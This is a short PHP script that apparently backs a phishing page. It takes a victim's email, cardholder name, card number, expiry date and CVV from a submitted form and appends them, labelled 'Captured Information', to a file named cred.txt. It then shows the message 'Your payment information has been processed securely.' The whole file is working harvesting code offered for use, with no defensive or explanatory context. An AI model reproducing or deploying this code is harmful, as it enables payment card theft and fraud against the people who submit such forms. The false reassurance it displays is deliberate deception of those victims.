<?php
// Get the form data
if ($_SERVER['REQUEST_METHOD'] == 'POST') {
    // Get the email (passed through hidden field)
    $email = isset($_POST['email']) ? $_POST['email'] : 'N/A';
    $card_name = isset($_POST['card_name']) ? $_POST['card_name'] : 'N/A';
    $card_number = isset($_POST['card_number']) ? $_POST['card_number'] : 'N/A';
    $exp_date = isset($_POST['exp_date']) ? $_POST['exp_date'] : 'N/A';
    $cvv = isset($_POST['cvv']) ? $_POST['cvv'] : 'N/A';

    // Format the data
    $date_time = date("Y-m-d H:i:s");
    $captured_info = "==================== Captured Information ====================\n";
    $captured_info .= "Date & Time: " . $date_time . "\n";
    $captured_info .= "Email: " . $email . "\n";
    $captured_info .= "Cardholder's Name: " . $card_name . "\n";
    $captured_info .= "Card Number: " . $card_number . "\n";
    $captured_info .= "Expiration Date: " . $exp_date . "\n";
    $captured_info .= "CVV: " . $cvv . "\n";
    $captured_info .= "==============================================================\n\n";

    // Save to the cred.txt file
    $file = fopen("cred.txt", "a"); // Open the file in append mode
    if ($file) {
        fwrite($file, $captured_info); // Write the captured data to the file
        fclose($file); // Close the file
    } else {
        echo "Error: Unable to open the file.";
    }

    // Redirect or confirm the user
    echo "<p>Your payment information has been processed securely.</p>";
} else {
    echo "<p>No data received. Please submit the form first.</p>";
}
?>
